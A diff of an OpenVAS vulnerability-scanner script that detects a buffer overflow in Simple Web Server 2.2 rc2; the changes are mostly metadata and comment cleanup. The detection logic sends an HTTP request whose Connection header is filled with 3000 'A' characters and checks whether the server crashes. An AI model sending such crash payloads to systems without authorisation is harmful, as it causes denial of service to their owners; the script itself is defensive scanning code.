@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_simple_web_server_conn_header_bof_vuln.nasl 6697 2017-07-12 11:40:05Z cfischer $
+# $Id: gb_simple_web_server_conn_header_bof_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
 #
 # Simple Web Server Connection Header Buffer Overflow Vulnerability
 #
@@ -27,11 +27,11 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802916");
-  script_version("$Revision: 6697 $");
+  script_version("$Revision: 11374 $");
   script_bugtraq_id(54605);
   script_tag(name:"cvss_base", value:"6.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-12 13:40:05 +0200 (Wed, 12 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-07-23 16:50:34 +0530 (Mon, 23 Jul 2012)");
   script_name("Simple Web Server Connection Header Buffer Overflow Vulnerability");
 
@@ -50,16 +50,14 @@ if(description)
 
   script_tag(name:"insight", value:"A specially crafted data sent via HTTP header 'Connection:',
   triggers a buffer overflow and executes arbitrary code on the target system.");
-  script_tag(name:"solution", value:"No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
+  script_tag(name:"solution", value:"No known solution was made available for at least one year
+  since the disclosure of this vulnerability. Likely none will be provided anymore.
   General solution options are to upgrade to a newer release, disable respective
   features, remove the product or replace the product by another one.");
   script_tag(name:"summary", value:"This host is running Simple Web Server and is prone to buffer
   overflow vulnerability.");
   script_tag(name:"impact", value:"Successful exploitation allows remote attackers to execute
-  arbitrary code on the target system or cause a denial of service condition.
-
-  Impact Level: Application");
+  arbitrary code on the target system or cause a denial of service condition.");
   script_tag(name:"affected", value:"Simple Web Server version 2.2 rc2");
 
   script_tag(name:"solution_type", value:"WillNotFix");
@@ -68,35 +66,22 @@ if(description)
 }
 
 include("http_func.inc");
-include("http_keepalive.inc");
 
-## Variable Initialization
-req = "";
-res = "";
-host = "";
-port = 0;
-
-## Simple Web Server HTTP port
 port = get_http_port(default:80);
 
-## Get Host name
 host = http_host_name(port:port);
 
-## Confirm the application before trying exploit
 banner = get_http_banner(port: port);
 if(!banner || "Server: PMSoftware-SWS" >!< banner){
   exit(0);
 }
 
-##Construct a crafted request
 req = string("GET / HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
              "Connection: ", crap(data: "A", length: 3000), "\r\n\r\n");
 
-## Send crafted request
 res = http_send_recv(port:port, data:req);
 
-## Confirm HTTP Port is dead
 if(http_is_dead(port:port)){
   security_message(port:port);
   exit(0);
